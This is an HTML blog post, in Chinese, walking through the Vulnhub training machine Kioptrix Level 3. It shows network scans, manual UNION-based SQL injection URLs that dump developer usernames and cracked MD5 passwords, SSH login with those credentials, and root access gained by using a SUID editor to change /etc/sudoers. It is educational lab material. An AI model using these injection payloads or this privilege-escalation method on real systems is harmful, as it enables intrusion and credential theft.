@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Sh4Nn0n's Blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="Kioptrix Level 3信息收集1234root@kali:~# netdiscover -i eth0 -r 192.168.208.1   IP            At MAC Address     Count     Len  MAC Vendor / Hostname       ------------------------------------------------">
+<meta name="keywords" content="渗透测试,Vulnhub,OSCP,Kioptrix-lv.3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-Kioptrix-lv.3-WalkThrough">
+<meta property="og:url" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/index.html">
+<meta property="og:site_name" content="Sh4Nn0n&#39;s Blog">
+<meta property="og:description" content="Kioptrix Level 3信息收集1234root@kali:~# netdiscover -i eth0 -r 192.168.208.1   IP            At MAC Address     Count     Len  MAC Vendor / Hostname       ------------------------------------------------">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/4.png">
+<meta property="og:updated_time" content="2020-03-05T09:32:33.316Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vulnhub-Kioptrix-lv.3-WalkThrough">
+<meta name="twitter:description" content="Kioptrix Level 3信息收集1234root@kali:~# netdiscover -i eth0 -r 192.168.208.1   IP            At MAC Address     Count     Len  MAC Vendor / Hostname       ------------------------------------------------">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/1.png">
+  <link rel="canonical" href="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>vulnhub-Kioptrix-lv.3-WalkThrough | Sh4Nn0n's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sh4Nn0n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">^.^</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sh4Nn0n">
+      <meta itemprop="description" content="^.^">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sh4Nn0n's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">vulnhub-Kioptrix-lv.3-WalkThrough
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-05 17:18:09 / 修改时间：17:32:33" itemprop="dateCreated datePublished" datetime="2020-03-05T17:18:09+08:00">2020-03-05</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Vulnhub/" itemprop="url" rel="index"><span itemprop="name">Vulnhub</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Kioptrix-Level-3"><a href="#Kioptrix-Level-3" class="headerlink" title="Kioptrix Level 3"></a>Kioptrix Level 3</h1><hr><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netdiscover -i eth0 -r 192.168.208.1</span><br><span class="line">  <span class="built_in"> IP </span>           At MAC<span class="built_in"> Address </span>    Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.208.142 00:0c:29:00:48:bf      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+ <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> root@kali:~# nmap -p- -T4 -vv -n -Pn 192.168.208.142</span><br><span class="line">Reason: 65533 resets</span><br><span class="line">PORT   STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 64</span><br><span class="line">80/tcp open  http    syn-ack ttl 64</span><br><span class="line">MAC Address: 00:0C:29:00:48:BF (VMware)</span><br></pre></td></tr></table></figure>
+
+<p>扫80端口</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -h 192.168.208.142</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          192.168.208.142</span><br><span class="line">+ Target Hostname:    192.168.208.142</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ <span class="keyword">Start</span> <span class="built_in">Time</span>:         <span class="number">2020</span><span class="number">-01</span><span class="number">-19</span> <span class="number">07</span>:<span class="number">19</span>:<span class="number">37</span> (GMT<span class="number">-5</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">2.2</span><span class="number">.8</span> (Ubuntu) PHP/<span class="number">5.2</span><span class="number">.4</span><span class="number">-2</span>ubuntu5<span class="number">.6</span> <span class="keyword">with</span> Suhosin-<span class="keyword">Patch</span></span><br><span class="line">+ Retrieved x-powered-<span class="keyword">by</span> header: PHP/<span class="number">5.2</span><span class="number">.4</span><span class="number">-2</span>ubuntu5<span class="number">.6</span></span><br><span class="line">+ The <span class="keyword">anti</span>-clickjacking X-Frame-Options header <span class="keyword">is</span> <span class="keyword">not</span> present.</span><br><span class="line">+ The X-XSS-<span class="keyword">Protection</span> header <span class="keyword">is</span> <span class="keyword">not</span> defined. This header can hint <span class="keyword">to</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> protect against <span class="keyword">some</span> forms <span class="keyword">of</span> XSS</span><br><span class="line">+ The X-<span class="keyword">Content</span>-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could <span class="keyword">allow</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> render the <span class="keyword">content</span> <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span></span><br><span class="line">+ Cookie PHPSESSID created <span class="keyword">without</span> the httponly flag</span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="keyword">found</span> (<span class="keyword">use</span> <span class="string">'-C all'</span> <span class="keyword">to</span> <span class="keyword">force</span> <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ Apache/<span class="number">2.2</span><span class="number">.8</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> Apache/<span class="number">2.4</span><span class="number">.37</span>). Apache <span class="number">2.2</span><span class="number">.34</span> <span class="keyword">is</span> the EOL <span class="keyword">for</span> the <span class="number">2.</span>x branch.</span><br><span class="line">+ PHP/<span class="number">5.2</span><span class="number">.4</span><span class="number">-2</span>ubuntu5<span class="number">.6</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> <span class="number">7.2</span><span class="number">.12</span>). PHP <span class="number">5.6</span><span class="number">.33</span>, <span class="number">7.0</span><span class="number">.27</span>, <span class="number">7.1</span><span class="number">.13</span>, <span class="number">7.2</span><span class="number">.1</span> may also <span class="keyword">current</span> <span class="keyword">release</span> <span class="keyword">for</span> <span class="keyword">each</span> branch.</span><br><span class="line">+ <span class="keyword">Server</span> may leak inodes via ETags, header <span class="keyword">found</span> <span class="keyword">with</span> <span class="keyword">file</span> /favicon.ico, inode: <span class="number">631780</span>, <span class="keyword">size</span>: <span class="number">23126</span>, mtime: Fri Jun  <span class="number">5</span> <span class="number">15</span>:<span class="number">22</span>:<span class="number">00</span> <span class="number">2009</span></span><br><span class="line">+ Web <span class="keyword">Server</span> <span class="keyword">returns</span> a valid response <span class="keyword">with</span> junk <span class="keyword">HTTP</span> methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ OSVDB<span class="number">-877</span>: <span class="keyword">HTTP</span> <span class="keyword">TRACE</span> method <span class="keyword">is</span> active, suggesting the host <span class="keyword">is</span> vulnerable <span class="keyword">to</span> XST</span><br><span class="line">+ OSVDB<span class="number">-12184</span>: /?=PHPB8B5F2A0<span class="number">-3</span>C92<span class="number">-11</span>d3-A3A9<span class="number">-4</span>C7B08C10000: PHP reveals potentially sensitive information via certain <span class="keyword">HTTP</span> requests that contain specific <span class="keyword">QUERY</span> strings.</span><br><span class="line">+ OSVDB<span class="number">-12184</span>: /?=PHPE9568F36-D428<span class="number">-11</span>d2-A769<span class="number">-00</span>AA001ACF42: PHP reveals potentially sensitive information via certain <span class="keyword">HTTP</span> requests that contain specific <span class="keyword">QUERY</span> strings.</span><br><span class="line">+ OSVDB<span class="number">-12184</span>: /?=PHPE9568F34-D428<span class="number">-11</span>d2-A769<span class="number">-00</span>AA001ACF42: PHP reveals potentially sensitive information via certain <span class="keyword">HTTP</span> requests that contain specific <span class="keyword">QUERY</span> strings.</span><br><span class="line">+ OSVDB<span class="number">-12184</span>: /?=PHPE9568F35-D428<span class="number">-11</span>d2-A769<span class="number">-00</span>AA001ACF42: PHP reveals potentially sensitive information via certain <span class="keyword">HTTP</span> requests that contain specific <span class="keyword">QUERY</span> strings.</span><br><span class="line">+ OSVDB<span class="number">-3092</span>: /phpmyadmin/changelog.php: phpMyAdmin <span class="keyword">is</span> <span class="keyword">for</span> managing MySQL <span class="keyword">databases</span>, <span class="keyword">and</span> should be protected <span class="keyword">or</span> limited <span class="keyword">to</span> authorized hosts.</span><br><span class="line">+ OSVDB<span class="number">-3268</span>: /icons/: <span class="keyword">Directory</span> <span class="keyword">indexing</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3233</span>: /icons/README: Apache <span class="keyword">default</span> <span class="keyword">file</span> found.</span><br><span class="line">+ /phpmyadmin/: phpMyAdmin <span class="keyword">directory</span> <span class="keyword">found</span></span><br><span class="line">+ OSVDB<span class="number">-3092</span>: /phpmyadmin/Documentation.html: phpMyAdmin <span class="keyword">is</span> <span class="keyword">for</span> managing MySQL <span class="keyword">databases</span>, <span class="keyword">and</span> should be protected <span class="keyword">or</span> limited <span class="keyword">to</span> authorized hosts.</span><br><span class="line">+ <span class="number">7914</span> requests: <span class="number">0</span> <span class="keyword">error</span>(s) <span class="keyword">and</span> <span class="number">19</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2020</span><span class="number">-01</span><span class="number">-19</span> <span class="number">07</span>:<span class="number">19</span>:<span class="number">56</span> (GMT<span class="number">-5</span>) (<span class="number">19</span> <span class="keyword">seconds</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br></pre></td></tr></table></figure>
+
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>根据提示, 看一下新的gallery cms<br><img src="/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/1.png" alt><br><img src="/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/2.png" alt><br>这里有个种类选择的按钮, 尝试选择一下<br>按照id选择, 肯定和数据库有交互,尝试一下sql注入<br><img src="/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/3.png" alt><br><img src="/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/4.png" alt><br>老规矩, 不使用自动化脚本</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//kioptrix</span>3.com/gallery/gallery.php?id=<span class="number">1</span>%20and%201=<span class="number">1</span>&amp;<span class="keyword">sort</span>=photoid<span class="comment">#photos</span></span><br><span class="line">http:<span class="regexp">//kioptrix</span>3.com/gallery/gallery.php?id=<span class="number">1</span>%20order%20by%206%20--&amp;<span class="keyword">sort</span>=photoid<span class="comment">#photos</span></span><br><span class="line">http:<span class="regexp">//kioptrix</span>3.com/gallery/gallery.php?id=-<span class="number">1</span>%20union%20select%201,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>%20--&amp;<span class="keyword">sort</span>=photoid<span class="comment">#photos</span></span><br></pre></td></tr></table></figure>
+
+<p>发现总共6个字段其中2 ,3 可以回显</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//kioptrix</span>3.com/gallery/gallery.php?id=-<span class="number">1</span>%20union%20SELECT%201,<span class="number">2</span>,group_concat(%27%27,schema_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>%20FROM%20information_schema.schemata&amp;<span class="keyword">sort</span>=photoid<span class="comment">#photos</span></span><br><span class="line">http:<span class="regexp">//kioptrix</span>3.com/gallery/gallery.php?id=-<span class="number">1</span>%20union%20SELECT%201,group_concat(table_name,%27%27),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>%20FROM%20information_schema.tables%20WHERE%20table_schema=%27gallery%27%20--&amp;<span class="keyword">sort</span>=photoid<span class="comment">#photos</span></span><br><span class="line">http:<span class="regexp">//kioptrix</span>3.com/gallery/gallery.php?id=-<span class="number">1</span>%20union%20SELECT%201,group_concat(column_name,%27%27),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>%20FROM%20information_schema.columns%20WHERE%20table_name=%27dev_accounts%27%20--&amp;<span class="keyword">sort</span>=photoid<span class="comment">#photos</span></span><br><span class="line">http:<span class="regexp">//kioptrix</span>3.com/gallery/gallery.php?id=-<span class="number">1</span>%20union%20SELECT%201,group_concat(username,%27%27,password),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>%20FROM%20dev_accounts%20--&amp;<span class="keyword">sort</span>=photoid<span class="comment">#photos</span></span><br><span class="line">dreg</span><br><span class="line">0d3eccfb887aabd50f243b3f155c0f85(Mast3r)</span><br><span class="line">loneferret</span><br><span class="line"><span class="number">5</span>badcaf789d3d1d09794d8f021f40f0e(starwars)</span><br></pre></td></tr></table></figure>
+
+<p>发现dev_accounts表, 推测是开发者账号密码, md5解密, 尝试ssh登录</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh loneferret@192.168.208.142</span></span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="string">'192.168.208.142 (192.168.208.142)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span><span class="number">192.168</span>.<span class="number">208.142</span><span class="string">' (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">loneferret@192.168.208.142'</span>s password: </span><br><span class="line">Linux Kioptrix3 <span class="number">2.6</span>.<span class="number">24</span>-<span class="number">24</span>-server <span class="comment">#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="regexp">/usr/share/doc/</span>*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent permitted <span class="keyword">by</span></span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http:<span class="regexp">//help.ubuntu.com/</span></span><br><span class="line"><span class="regexp">Last login: Wed Jan 15 10:27:57 2020 from 192.168.208.131</span></span><br><span class="line"><span class="regexp">loneferret@Kioptrix3:~$</span></span><br></pre></td></tr></table></figure>
+
+<p>成功登录</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ <span class="keyword">ls</span></span><br><span class="line">checksec.<span class="keyword">sh</span>  CompanyPolicy.README</span><br><span class="line">loneferret@Kioptrix3:~$ <span class="keyword">cat</span> CompanyPolicy.README </span><br><span class="line">Hello <span class="keyword">new</span> employee,</span><br><span class="line">It <span class="keyword">is</span> company policy here <span class="keyword">to</span> use our newly installed software <span class="keyword">for</span> editing, creating <span class="built_in">and</span> viewing <span class="keyword">files</span>.</span><br><span class="line">Please use the <span class="keyword">command</span> <span class="string">'sudo ht'</span>.</span><br><span class="line">Failure <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">so</span> will result in you immediate termination.</span><br><span class="line"></span><br><span class="line">DG</span><br><span class="line">CEO</span><br></pre></td></tr></table></figure>
+
+<p>发现公司策略文件, ht文件可以sudo执行.</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loneferret<span class="meta">@Kioptrix</span><span class="number">3:</span>~$ which ht</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>ht</span><br><span class="line">loneferret<span class="meta">@Kioptrix</span><span class="number">3:</span>~$ ls -la <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>ht</span><br><span class="line">-rwsr-sr-x <span class="number">1</span> root root <span class="number">2072344</span> <span class="number">2011</span><span class="number">-04</span><span class="number">-16</span> <span class="number">07</span>:<span class="number">26</span> <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>ht</span><br></pre></td></tr></table></figure>
+
+<p>查找ht文件并查看权限, 发现是s权限(Set UID 简称SUID:<br>即当执行该文件时将具有该文件所有者的权限. )</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">loneferret<span class="variable">@Kioptrix3</span><span class="symbol">:~</span><span class="variable">$ </span>cd /usr/local/bin/</span><br><span class="line">loneferret<span class="variable">@Kioptrix3</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>ls</span><br><span class="line">armitage  msfconsole  msfencode  msfmachscan  msfrpc</span><br><span class="line">ht        msfd        msfgui     msfpayload   msfrpcd</span><br><span class="line">msfcli    msfelfscan  msfirb     msfpescan    msfupdate</span><br><span class="line">loneferret<span class="variable">@Kioptrix3</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>./ht</span><br><span class="line">Error opening <span class="symbol">terminal:</span> xterm-<span class="number">256</span>color.</span><br><span class="line">loneferret<span class="variable">@Kioptrix3</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>export TERM=xterm</span><br><span class="line">loneferret<span class="variable">@Kioptrix3</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>./ht</span><br></pre></td></tr></table></figure>
+
+<p>按f3 然后进入/etc/sudoers 把/bin/bash 加在 loneferret 的那里, Alt+F 保存并退出</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loneferret<span class="variable">@Kioptrix3</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>sudo /bin/bash</span><br><span class="line">root<span class="variable">@Kioptrix3</span><span class="symbol">:/usr/local/bin</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root<span class="variable">@Kioptrix3</span><span class="symbol">:/usr/local/bin</span><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root<span class="variable">@Kioptrix3</span><span class="symbol">:/usr/local/bin</span><span class="comment"># hostname</span></span><br><span class="line">Kioptrix3</span><br></pre></td></tr></table></figure>
+
+<p>至此结束.</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+            
+              <a href="/tags/Vulnhub/" rel="tag"># Vulnhub</a>
+            
+              <a href="/tags/OSCP/" rel="tag"># OSCP</a>
+            
+              <a href="/tags/Kioptrix-lv-3/" rel="tag"># Kioptrix-lv.3</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/03/05/vulnhub-Kioptrix-lv-2-WalkThrough/" rel="next" title="vulnhub-Kioptrix-lv.2-WalkThrough">
+                  <i class="fa fa-chevron-left"></i> vulnhub-Kioptrix-lv.2-WalkThrough
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/" rel="prev" title="vulnhub-Kioptrix2014-WalkThrough">
+                  vulnhub-Kioptrix2014-WalkThrough <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
